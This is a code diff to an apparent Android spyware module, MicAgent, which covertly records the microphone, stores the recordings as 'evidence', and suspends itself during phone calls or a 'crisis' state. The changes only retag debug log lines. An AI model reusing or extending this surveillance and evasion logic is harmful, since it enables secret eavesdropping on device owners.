@@ -82,7 +82,7 @@ public class MicAgent extends AgentBase {
 				if (state != StateRun.STARTED) {
 					addPhoneListener();
 					startRecorder();
-					Log.d(TAG, "started");
+					Log.d("QZ", TAG + "started");
 				}
 				state = StateRun.STARTED;
 			}
@@ -121,7 +121,7 @@ public class MicAgent extends AgentBase {
 			state = StateRun.STOPPED;
 
 		}
-		Log.d(TAG, "stopped");
+		Log.d("QZ", TAG + "stopped");
 
 	}
 
@@ -148,7 +148,7 @@ public class MicAgent extends AgentBase {
 			new LogR(EvidenceType.MIC, getAdditionalData(), data);
 
 		} else {
-			Log.d(TAG,"zero chunk ");
+			Log.d("QZ", TAG + "zero chunk ");
 			numFailures += 1;
 		}
 	}
@@ -188,16 +188,16 @@ public class MicAgent extends AgentBase {
 				if (numFailures < 10) {
 					saveRecorderEvidence();
 				} else {
-					Log.d(TAG, "numFailures: " + numFailures);
+					Log.d("QZ", TAG + "numFailures: " + numFailures);
 					suspend();
 				}
 
 				if (callInAction()) {
-					Log.d(TAG, "phone call in progress, suspend!");
+					Log.d("QZ", TAG + "phone call in progress, suspend!");
 					suspend();
 
 				} else if (Status.self().crisisMic()) {
-					Log.d(TAG, "crisis, suspend!");
+					Log.d("QZ", TAG + "crisis, suspend!");
 					suspend();
 				}
 			}
